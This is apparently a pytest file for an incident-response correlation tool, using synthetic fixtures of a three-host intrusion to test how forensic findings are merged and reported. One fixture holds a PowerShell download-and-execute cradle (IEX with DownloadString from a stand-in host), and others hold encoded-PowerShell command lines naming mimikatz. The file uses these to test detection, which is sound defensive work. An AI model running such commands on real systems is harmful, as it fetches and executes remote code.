"""Fusion correlation + report tests, fixture-driven (no live infra).

Run inside the backend container:
    python3 -m tests.fusion.test_fusion          # prints the demo report
    python3 -m pytest services/fusion/tests/test_fusion.py # asserts
"""

import sys
if "/app" not in sys.path:
    sys.path.insert(0, "/app")

import contextlib  # noqa: E402

from services.fusion import correlate, render, llm_sim, keys  # noqa: E402
from services.fusion.mappers import map_memory, map_agentic   # noqa: E402


@contextlib.contextmanager
def force_sim():
    """Force the deterministic (no-LLM) chat path so these assertions are
    reproducible even when a live LLM happens to be configured in the env.
    (Chat now talks to a real model whenever one is available.)"""
    saved = (llm_sim._use_real, llm_sim._llm_available)
    llm_sim._use_real = lambda: False
    llm_sim._llm_available = lambda: False
    try:
        yield
    finally:
        llm_sim._use_real, llm_sim._llm_available = saved

# ---- fixtures: a 3-host intrusion, initial access ~ 2026-05-19 ------------
WS01, DC01, SRVVC = "C.aaa1", "C.bbb2", "C.ccc3"

MEMORY_PAYLOAD = {
    "host": "WS01",
    "plugins": {
        "volatility3.plugins.windows.pslist.PsList": [
            {"PID": 2396, "PPID": 6352, "ImageFileName": "powershell_ise.exe",
             "CreateTime": "2026-05-19T08:14:20+00:00"},
            {"PID": 6352, "PPID": 5000, "ImageFileName": "explorer.exe",
             "CreateTime": "2026-05-19T07:55:00+00:00"},
        ],
        "volatility3.plugins.windows.malfind.Malfind": [
            {"PID": 2396, "Process": "powershell_ise.exe",
             "Protection": "PAGE_EXECUTE_READWRITE"},
        ],
        "volatility3.plugins.windows.netscan.NetScan": [
            {"PID": 2396, "LocalAddr": "10.0.0.5", "LocalPort": 50001,
             "RemoteAddr": "5.100.251.10", "RemotePort": 443, "State": "ESTABLISHED"},
        ],
    },
    "yara": [{"rule": "REDLEAVES_CoreImplant", "pid": 2396, "tags": "APT"}],
}

AGENTIC_DATA = {
    "Generic.System.Pstree": [
        {"_client_id": WS01, "_hostname": "WS01", "Pid": 2396, "Ppid": 6352,
         "Name": "powershell_ise.exe", "CreateTime": "2026-05-19T08:14:20Z",
         "CommandLine": "powershell_ise -enc ...", "User": "jsmith", "Domain": "CORP"},
        {"_client_id": DC01, "_hostname": "DC01", "Pid": 1000, "Ppid": 4,
         "Name": "svchost.exe", "CreateTime": "2026-05-19T07:00:00Z"},
    ],
    "Windows.Network.NetstatEnriched": [
        {"_client_id": DC01, "_hostname": "DC01", "Pid": 1000,
         "RemoteAddr": "5.100.251.10", "RemotePort": 443, "State": "ESTABLISHED"},
    ],
    "Windows.EventLogs.RDPAuth": [
        {"_client_id": DC01, "_hostname": "DC01", "User": "administrator",
         "Domain": "CORP", "LogonType": 10, "TimeCreated": "2026-05-19T09:30:00Z"},
        {"_client_id": SRVVC, "_hostname": "SRV-VC", "User": "administrator",
         "Domain": "CORP", "LogonType": 10, "TimeCreated": "2026-05-19T10:15:00Z"},
    ],
}
HOSTNAMES = {WS01: "WS01", DC01: "DC01", SRVVC: "SRV-VC"}
WINDOW = {"start": "2026-05-17T00:00:00", "end": "2026-05-26T00:00:00"}


def build():
    mem = map_memory(MEMORY_PAYLOAD, run_id="mem_1", asset=keys.asset_id(WS01), hostname="WS01")
    agt = map_agentic(AGENTIC_DATA, run_id="agt_1", hostnames=HOSTNAMES)
    return correlate.assemble("case_demo", [mem, agt], ["mem_1", "agt_1"])


# --------------------------------------------------------------------- tests
def test_process_merge_cross_module():
    g = build()
    pid_eid = keys.process_id(keys.asset_id(WS01), 2396, "2026-05-19T08:14:20")
    e = g.entities.get(pid_eid)
    assert e is not None, "powershell_ise process must exist with the bucketed key"
    assert set(e.sources) == {"memory", "agentic"}, f"must merge both modules, got {e.sources}"
    assert "injected" in e.flags


def test_pid_reuse_not_merged():
    base = build()
    n_before = len([e for e in base.entities.values() if e.type == "process"])
    extra = ([], [])
    reuse = map_agentic({"Generic.System.Pstree": [
        {"_client_id": WS01, "_hostname": "WS01", "Pid": 2396, "Ppid": 1,
         "Name": "evil.exe", "CreateTime": "2026-05-19T20:00:00Z"}]},
        run_id="agt_2", hostnames=HOSTNAMES)
    g = correlate.assemble("c", [map_memory(MEMORY_PAYLOAD, run_id="m", asset=keys.asset_id(WS01)),
                                 map_agentic(AGENTIC_DATA, run_id="a", hostnames=HOSTNAMES),
                                 reuse], ["m", "a", "agt_2"])
    procs = [e for e in g.entities.values() if e.type == "process"
             and e.attrs.get("pid") == "2396" and keys.asset_id(WS01) in (e.attrs.get("_assets") or [])]
    assert len(procs) == 2, "same PID, different createtime+image must stay separate"
    assert any("pid_reused" in p.flags for p in procs)


def test_cross_host_ioc():
    g = build()
    iid = keys.ioc_id("ip", "5.100.251.10")
    e = g.entities[iid]
    assert len(e.attrs.get("_assets") or []) == 2, "C2 IP must be on WS01 + DC01"
    assert "cross_host" in e.flags
    assert any(f.kind == "cross_host" and iid in f.entity_ids for f in g.findings)


def test_cross_host_account_lateral_movement():
    g = build()
    acct = [e for e in g.entities.values() if e.type == "account" and "administrator" in e.id]
    assert acct, "domain admin account node must exist"
    a = acct[0]
    assert len(a.attrs.get("_assets") or []) == 2, "admin used on DC01 + SRV-VC"
    lat = [f for f in g.findings if f.kind == "cross_host" and a.id in f.entity_ids]
    assert lat and "T1021" in lat[0].mitre


def test_injected_process_with_c2_finding():
    g = build()
    c2 = [f for f in g.findings if f.title.startswith("Injected process with C2")]
    assert c2, "must derive the injected+C2 finding"
    assert c2[0].severity == "critical"
    assert set(c2[0].sources) >= {"memory", "agentic"}


def test_time_window_scope():
    g = build()
    _, inwin = render.scope(g, window=WINDOW, min_severity="informational")
    _, outwin = render.scope(g, window={"start": "2030-01-01", "end": "2030-02-01"},
                             min_severity="informational")
    assert inwin and not [f for f in outwin if f.ts], "out-of-window time-anchored findings dropped"


def test_report_has_three_altitudes_and_cross_host():
    g = build()
    with force_sim():
        md = llm_sim.generate_report(g, window=WINDOW, min_severity="low",
                                     initial_access="2026-05-19T08:14:20", case_name="INTRUSION-MAY")
    # New structure: strategic (Exec Summary) · operational (Priority Hosts table) ·
    # tactical (single Timeline) + the IOC appendix — no duplicated sections.
    for section in ("Executive Summary", "Identity Risk", "Timeline of Events",
                    "Indicators of Compromise"):
        assert section in md, f"missing section: {section}"
    assert "across" in md.lower() or "cross-host" in md.lower()   # lateral / cross-host
    assert "5.100.251.10" in md


def test_chat_grounded():
    g = build()
    with force_sim():
        a1 = llm_sim.chat(g, "how did they move laterally?", window=WINDOW, min_severity="low")
        a2 = llm_sim.chat(g, "what about 5.100.251.10?", window=WINDOW, min_severity="low")
    assert "administrator" in a1.lower() or "lateral" in a1.lower()
    assert "cross-host" in a2.lower()


def test_ioc_and_mitre_sections():
    g = build()
    with force_sim():
        md = llm_sim.generate_report(g, window=WINDOW, min_severity="low", case_name="X")
    assert "Indicators of Compromise" in md and "5.100.251.10" in md
    assert "MITRE ATT&CK" in md and "T1071" in md and "T1021" in md


def test_persistence_service_finding():
    payload = {"host": "H", "yara": [], "plugins": {"svcscan": [
        {"Name": "EvilSvc", "State": "SERVICE_RUNNING", "PID": 4444,
         "Binary": "C:\\Users\\x\\AppData\\Local\\Temp\\evil.exe"}]}}
    g = correlate.assemble("c", [map_memory(payload, run_id="m", asset=keys.asset_id("C.x"))], ["m"])
    svc = [f for f in g.findings if "service" in f.title.lower()]
    assert svc and "T1543" in svc[0].mitre


def test_hostname_asset_merges_into_client_id_asset():
    from services.fusion.mappers import map_agentic, map_timesketch
    DC = "C.dcdcdc"
    agt = map_agentic({"Generic.System.Pstree": [
        {"_client_id": DC, "_hostname": "DC01", "Pid": 1, "Name": "x",
         "CreateTime": "2026-06-15T07:00:00Z"}]}, run_id="a", hostnames={DC: "DC01"})
    # A hostname-keyed contribution (no client_id) must fold into the
    # client_id-keyed asset rather than creating a second DC01 node.
    ts = map_timesketch([{"datetime": "2026-05-19T08:00:00", "message": "logon",
                          "parser": "evtx"}], run_id="t",
                        asset=keys.asset_id(DC), hostname="DC01")
    g = correlate.assemble("c", [agt, ts], ["a", "t"])
    assets = g.by_type("asset")
    assert len(assets) == 1, f"DC01 must be ONE node, got {[a.id for a in assets]}"
    assert keys.asset_id(DC) in g.entities, "canonical client_id asset survives"


def test_three_module_integration():
    from services.fusion.mappers import map_timesketch
    mem = map_memory(MEMORY_PAYLOAD, run_id="m", asset=keys.asset_id(WS01), hostname="WS01")
    agt = map_agentic(AGENTIC_DATA, run_id="a", hostnames=HOSTNAMES)
    ts = map_timesketch([{"datetime": "2026-05-19T08:00:00", "message": "beacon to 5.100.251.10",
                          "parser": "evtx"}], run_id="t", asset=keys.asset_id(WS01), hostname="WS01")
    g = correlate.assemble("case", [mem, agt, ts], ["m", "a", "t"])
    srcs = set()
    for e in g.entities.values():
        srcs.update(e.sources)
    assert {"memory", "agentic", "timesketch"} <= srcs, f"all 3 modules merge, got {srcs}"
    with force_sim():
        md = llm_sim.generate_report(g, window=WINDOW, min_severity="medium", case_name="FULL")
    assert "Vulnerability" in md or "CVE-2024-0001" in md
    assert "Timeline of Events" in md   # all four modules render into the single report


def test_cloud_endpoint_correlation():
    """A cloud user/IP that also appears on an endpoint must be ONE node
    (the cross-domain pivot)."""
    from services.fusion.mappers import map_cloud, map_agentic
    agt = map_agentic({
        "Windows.EventLogs.RDPAuth": [{"_client_id": "C.a", "_hostname": "WS01",
                                       "User": "administrator", "Domain": "OMCDOM",
                                       "TimeCreated": "2026-06-15T09:00:00Z"}],
        "Windows.Network.NetstatEnriched": [{"_client_id": "C.a", "Pid": 1,
                                             "RemoteAddr": "5.6.7.8"}]},
        run_id="a", hostnames={"C.a": "WS01"})
    cloud = map_cloud([{"rule_title": "Risky sign-in", "_severity": "high",
                        "matched_record": {"userPrincipalName": "administrator@omcdom.com",
                                           "ipAddress": "5.6.7.8"},
                        "_timestamp": "2026-06-15T08:55:00", "mitre_attack": ["T1078"]}],
                      run_id="az", provider="azure", account="tenant1")
    g = correlate.assemble("c", [agt, cloud], ["a", "az"])
    acct = [e for e in g.entities.values() if e.type == "account" and "administrator" in e.id]
    assert acct and {"agentic", "cloud"} <= set(acct[0].sources), \
        f"cloud UPN must bridge endpoint domain account, got {[(a.id, a.sources) for a in acct]}"
    ip = g.entities[keys.ioc_id("ip", "5.6.7.8")]
    assert {"agentic", "cloud"} <= set(ip.sources), "shared source-IP must merge cloud+endpoint"
    assert any(f.title.startswith("AZURE:") for f in g.findings), "cloud SIGMA -> finding"


def test_escalation_recommendation():
    # a host that looks malicious under broad collection (agentic only) -> escalate
    from services.fusion.mappers import map_agentic
    agt = map_agentic({"Generic.System.Pstree": [
        {"_client_id": "C.zz", "_hostname": "WS9", "Pid": 9, "Name": "powershell.exe",
         "CommandLine": "powershell -enc bypass mimikatz", "CreateTime": "2026-06-15T08:00:00Z"}]},
        run_id="a", hostnames={"C.zz": "WS9"})
    g = correlate.assemble("c", [agt], ["a"])
    a = g.entities[keys.asset_id("C.zz")]
    assert a.attrs.get("escalate") is True, f"sev={a.severity} deep={a.attrs.get('deep')}"
    assert a.attrs.get("modules") == ["agentic"]
    with force_sim():
        md = llm_sim.generate_report(g, min_severity="low", case_name="X")
    # Escalation is now shown in the Priority Hosts table (🔺 + "Deep-dive now"),
    # not as a separate duplicate section.
    assert "WS9" in md and ("🔺" in md or "Deep-dive now" in md)
    with force_sim():
        nxt = llm_sim.chat(g, "what should I investigate next?", min_severity="low")
    assert "deep-dive" in nxt.lower()


def test_ioc_classification_quality():
    from services.fusion.keys import classify_indicator as C
    assert C("evil.exe") is None and C("a.dll") is None        # filenames, not domains
    assert C("10.0.0.5") is None and C("127.0.0.1") is None    # private/loopback
    assert C("192.168.1.1") is None and C("169.254.1.1") is None
    assert C("microsoft.com") is None                          # benign update domain
    assert C("5.100.251.140") == "ip"                          # external C2
    assert C("evil-c2.net") == "domain"
    assert C("a" * 64) == "hash"


def test_spawn_chain_finding():
    payload = {"host": "H", "yara": [], "plugins": {"pslist": [
        {"PID": 100, "PPID": 4, "ImageFileName": "winword.exe", "CreateTime": "2026-06-15T08:00:00"},
        {"PID": 200, "PPID": 100, "ImageFileName": "powershell.exe", "CreateTime": "2026-06-15T08:01:00"}]}}
    g = correlate.assemble("c", [map_memory(payload, run_id="m", asset=keys.asset_id("C.x"))], ["m"])
    assert any("spawn chain" in f.title.lower() for f in g.findings)


def test_attack_story_in_report():
    g = build()
    with force_sim():
        md = llm_sim.generate_report(g, window=WINDOW, min_severity="low", case_name="X",
                                     initial_access="2026-05-19")
    assert "most affected" in md and "Cross-host" in md


def test_pruned_keeps_signal():
    g = build()
    p = g.pruned(max_entities=3)
    assert len(p.findings) == len(g.findings)
    for e in g.entities.values():
        if e.type in ("asset", "ioc", "account", "vuln", "yarahit"):
            assert e.id in p.entities, f"high-value {e.type} dropped"
    for f in g.findings:
        for eid in f.entity_ids:
            assert eid in p.entities, "finding-referenced entity dropped"


# ---- regression: real Velociraptor schemas (validated on a live client) ---
def test_netstat_dotted_raddr_yields_ioc_and_edge():
    # Real Windows.Network.Netstat flattens structs to dotted columns. LISTEN
    # sockets (Raddr.IP 0.0.0.0) must be skipped; ESTABLISHED externals become
    # IOCs and link to their owning process by PID.
    cd = {"Generic.System.Pstree": [
              {"Pid": 900, "Ppid": 4, "Name": "evil.exe",
               "CreateTime": "2026-06-15T08:00:00Z", "_client_id": "C.z", "_hostname": "H"}],
          "Windows.Network.Netstat": [
              {"Pid": 22, "Name": "sshd.exe", "Status": "LISTEN",
               "Laddr.IP": "0.0.0.0", "Raddr.IP": "0.0.0.0", "_client_id": "C.z", "_hostname": "H"},
              {"Pid": 900, "Name": "evil.exe", "Status": "ESTAB",
               "Laddr.IP": "10.0.0.5", "Raddr.IP": "5.100.251.10", "_client_id": "C.z", "_hostname": "H"}]}
    g = correlate.assemble("c", [map_agentic(cd, run_id="a", hostnames={"C.z": "H"})], ["a"])
    iid = keys.ioc_id("ip", "5.100.251.10")
    assert iid in g.entities, "external Raddr.IP must become an IOC"
    assert not any(e.label == "0.0.0.0" for e in g.by_type("ioc")), "LISTEN 0.0.0.0 must be skipped"
    assert any(r.kind == "connected" and r.dst == iid for r in g.relationships), \
        "owning process must link to the remote IP"


def test_sys_users_maps_to_accounts():
    cd = {"Windows.Sys.Users": [
        {"Name": "SYSTEM", "UUID": "S-1-5-18", "Directory": "%systemroot%\\system32\\config",
         "_client_id": "C.z", "_hostname": "H"},
        {"Name": "tenroot", "UUID": "S-1-5-21-1-2-3-1001", "Directory": "C:\\Users\\tenroot",
         "_client_id": "C.z", "_hostname": "H"}]}
    ents, _ = map_agentic(cd, run_id="a", hostnames={"C.z": "H"})
    accts = [e for e in ents if e.type == "account"]
    assert len(accts) == 2, "each user row must become an account"
    assert any(a.attrs.get("sid") == "S-1-5-21-1-2-3-1001" for a in accts), "SID captured from UUID"


def test_service_scoring_no_false_positive_but_catches_temp():
    # Benign Windows services (svchost, Defender in ProgramData) must NOT flag;
    # a service whose image lives in a user-writable temp dir MUST.
    cd = {"Windows.System.Services": [
        {"Name": "vmicvmsession", "AbsoluteExePath": "C:\\WINDOWS\\system32\\svchost.exe",
         "_client_id": "C.z", "_hostname": "H"},
        {"Name": "WinDefend", "_client_id": "C.z", "_hostname": "H",
         "AbsoluteExePath": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe"},
        {"Name": "EvilSvc", "AbsoluteExePath": "C:\\Users\\x\\AppData\\Local\\Temp\\evil.exe",
         "_client_id": "C.z", "_hostname": "H"}]}
    g = correlate.assemble("c", [map_agentic(cd, run_id="a", hostnames={"C.z": "H"})], ["a"])
    svc_finds = {f.title for f in g.findings if "service" in f.title.lower()}
    assert not any("vmicvmsession" in t or "WinDefend" in t for t in svc_finds), \
        "trusted-root services must not be flagged"
    assert any("EvilSvc" in t for t in svc_finds), "temp-dir service must be flagged"


def test_psreadline_history_to_events():
    cd = {"Windows.System.Powershell.PSReadline": [
        {"Line": "# comment line", "Username": "bob", "OSPath": "h", "_client_id": "C.z", "_hostname": "H"},
        {"Line": "Get-ChildItem", "Username": "bob", "OSPath": "h", "_client_id": "C.z", "_hostname": "H"},
        {"Line": "IEX (New-Object Net.WebClient).DownloadString('http://x/y')",
         "Username": "bob", "OSPath": "h", "_client_id": "C.z", "_hostname": "H"}]}
    ents, rels = map_agentic(cd, run_id="a", hostnames={"C.z": "H"})
    evs = [e for e in ents if e.type == "event"]
    assert len(evs) == 2, "comments skipped, two commands kept"
    assert any("suspicious_powershell" in e.flags for e in evs), "IEX/DownloadString flagged"
    assert any(r.kind == "executed" for r in rels), "account executed the command"


def test_pslist_unsigned_in_temp_flags_and_hashes():
    h = "b" * 64
    cd = {"Windows.System.Pslist": [
        {"Pid": 10, "Ppid": 4, "Name": "evil.exe", "Exe": "C:\\Users\\v\\AppData\\Local\\Temp\\evil.exe",
         "CreateTime": "2026-06-15T08:00:00Z", "Hash": {"SHA256": h},
         "Authenticode": {"Trusted": "untrusted"}, "_client_id": "C.z", "_hostname": "H"}]}
    g = correlate.assemble("c", [map_agentic(cd, run_id="a", hostnames={"C.z": "H"})], ["a"])
    proc = [e for e in g.by_type("process") if "unsigned" in e.flags]
    assert proc and proc[0].anomaly >= 40, "unsigned temp binary flagged + scored"
    assert keys.ioc_id("hash", h) in g.entities, "unsigned binary hash -> cross-host IOC"


def test_pslist_catalog_signed_store_app_not_flagged():
    # MS Store / Program Files apps are catalog-signed -> Authenticode 'untrusted'
    # but benign; must NOT be flagged.
    cd = {"Windows.System.Pslist": [
        {"Pid": 11, "Ppid": 4, "Name": "WidgetService.exe", "TokenIsElevated": True,
         "Exe": "C:\\Program Files\\WindowsApps\\Microsoft.Widgets\\WidgetService.exe",
         "CreateTime": "2026-06-15T08:00:00Z", "Hash": {"SHA256": "c" * 64},
         "Authenticode": {"Trusted": "untrusted"}, "_client_id": "C.z", "_hostname": "H"}]}
    g = correlate.assemble("c", [map_agentic(cd, run_id="a", hostnames={"C.z": "H"})], ["a"])
    assert not [e for e in g.by_type("process") if "unsigned" in e.flags], \
        "catalog-signed Program Files app must not be flagged unsigned"
    assert not [f for f in g.findings if "WidgetService" in f.title]
    assert keys.ioc_id("hash", "c" * 64) not in g.entities, "benign hash not flooded into graph"


def test_mft_detection_typed_by_criticality_but_no_finding():
    cd = {"DetectRaptor.Windows.Detection.MFT": [
        {"Detection": {"Name": "Eventlog Erasing Tool", "Criticality": "High"},
         "OSPath": "C:\\Users\\x\\wevtutil.exe", "_client_id": "C.z", "_hostname": "H"},
        {"Detection": {"Name": "BAU Cloud Data Transfer", "Criticality": "Low"},
         "OSPath": "C:\\OneDrive.exe", "_client_id": "C.z", "_hostname": "H"}]}
    g = correlate.assemble("c", [map_agentic(cd, run_id="a", hostnames={"C.z": "H"})], ["a"])
    evs = [e for e in g.by_type("event") if "mft_detection" in e.flags]
    assert len(evs) == 2
    assert {e.severity for e in evs} == {"high", "low"}, "criticality -> severity faithfully"
    assert not [f for f in g.findings if "MFT" in f.title], "MFT detections are context, not auto-findings"


def test_applications_rmm_flagged():
    cd = {"DetectRaptor.Windows.Detection.Applications": [
        {"Category": "RMM - TeamViewer", "DisplayName": "TeamViewer", "_client_id": "C.z", "_hostname": "H"},
        {"Category": "Data Transfer - OneDrive", "DisplayName": "OneDrive", "_client_id": "C.z", "_hostname": "H"}]}
    ents, _ = map_agentic(cd, run_id="a", hostnames={"C.z": "H"})
    evs = [e for e in ents if e.type == "event"]
    rmm = [e for e in evs if "rmm_tool" in e.flags]
    assert len(rmm) == 1 and "TeamViewer" in rmm[0].label, "RMM/remote tools flagged for lateral/persistence"
    assert rmm[0].anomaly >= 20


def test_hayabusa_sigma_level_drives_severity_and_findings():
    # Real Windows.Hayabusa.Rules columns: Title + Level. Level must drive the
    # event severity (not the anomaly bucket), and only high/critical surface as
    # findings; same title firing N times collapses to one finding.
    rows = [{"Title": "Important Windows Eventlog Cleared", "Level": "high", "EID": 104,
             "Channel": "System", "RecordID": i, "Timestamp": "2026-05-19T08:00:00Z",
             "_client_id": "C.z", "_hostname": "H"} for i in range(5)]
    rows += [{"Title": "Net Conn (Sysmon Alert)", "Level": "medium", "EID": 3, "RecordID": 900,
              "Channel": "Sysmon", "Timestamp": "2026-05-19T08:00:00Z",
              "_client_id": "C.z", "_hostname": "H"}]
    g = correlate.assemble("c", [map_agentic({"Windows.Hayabusa.Rules": rows},
                                             run_id="a", hostnames={"C.z": "H"})], ["a"])
    sigma = [e for e in g.by_type("event") if "sigma" in e.flags]
    assert any(e.severity == "high" for e in sigma) and any(e.severity == "medium" for e in sigma), \
        "level maps straight to severity"
    sigma_finds = [f for f in g.findings if f.title.startswith("SIGMA:")]
    assert len(sigma_finds) == 1, "5x high same-title -> ONE finding; medium -> none"
    assert "5×" in sigma_finds[0].summary and sigma_finds[0].severity == "high"


def test_agentic_malfind_to_injected_process():
    # Windows.Detection.Malfind: RWX section in a process = injection. Must
    # become a process with the 'injected' flag (not a generic event), so the
    # injected-process finding fires from agentic data too.
    cd = {"Windows.Detection.Malfind": [
        {"Pid": 2396, "Name": "powershell_ise.exe", "CreateTime": "2026-05-19T08:14:20Z",
         "Protection": "rwx", "AddressRange": "1a0000-1b0000", "YaraHit": {"Rule": "REDLEAVES"},
         "_client_id": "C.z", "_hostname": "H"}]}
    g = correlate.assemble("c", [map_agentic(cd, run_id="a", hostnames={"C.z": "H"})], ["a"])
    proc = [e for e in g.by_type("process") if "injected" in e.flags]
    assert proc and proc[0].anomaly >= 100, "RWX malfind hit -> injected process, critical anomaly"
    assert g.by_type("yarahit"), "YaraHit inside the section -> yarahit entity"
    assert any(r.kind == "matched" for r in g.relationships)


def test_agentic_namedpipe_to_event_linked_to_process():
    cd = {"Generic.System.Pstree": [
              {"Pid": 800, "Ppid": 4, "Name": "rundll32.exe", "CreateTime": "2026-06-15T08:00:00Z",
               "_client_id": "C.z", "_hostname": "H"}],
          "DetectRaptor.Windows.Detection.NamedPipes": [
              {"PipeName": "\\msagent_cc", "ProcPid": 800, "ProcName": "rundll32.exe",
               "_client_id": "C.z", "_hostname": "H"}]}
    g = correlate.assemble("c", [map_agentic(cd, run_id="a", hostnames={"C.z": "H"})], ["a"])
    pipe_ev = [e for e in g.by_type("event") if "named pipe" in e.label]
    assert pipe_ev, "named pipe -> event"
    assert any(r.kind == "event_about" for r in g.relationships), "pipe event linked to its process"


if __name__ == "__main__":
    g = build()
    print(f"=== GRAPH: {len(g.entities)} entities, {len(g.relationships)} rels, "
          f"{len(g.findings)} findings "
          f"({sum(1 for f in g.findings if f.kind=='cross_host')} cross-host) ===\n")
    print(llm_sim.generate_report(g, window=WINDOW, min_severity="low",
                                  initial_access="2026-05-19T08:14:20", case_name="INTRUSION-MAY"))
    print("\n=== CHAT DEMO ===")
    for q in ("how did they move laterally?", "what about 5.100.251.10?",
              "tell me about WS01", "show me the timeline"):
        print(f"\nQ: {q}\n{llm_sim.chat(g, q, window=WINDOW, min_severity='low')}")
